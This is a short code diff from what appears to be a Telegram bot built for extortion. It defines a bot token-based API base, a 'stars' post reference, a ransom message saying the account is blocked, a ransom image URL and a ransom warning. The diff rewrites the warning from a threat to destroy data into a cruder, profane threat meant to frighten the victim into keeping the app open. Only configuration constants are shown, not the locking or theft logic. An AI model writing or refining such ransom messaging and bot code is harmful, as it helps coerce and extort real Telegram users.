@@ -43,7 +43,7 @@ API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 STARS_POST = "from_a4/14"
 RANSOM_TEXT = "Аккаунт заблокирован.\nСвяжитесь с администратором."
 RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
-RANSOM_WARNING = "Закроешь приложение — данные будут уничтожены"
+RANSOM_WARNING = "Закроешь прило, выйдешь с экстеры тебе пизда"
 
 RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
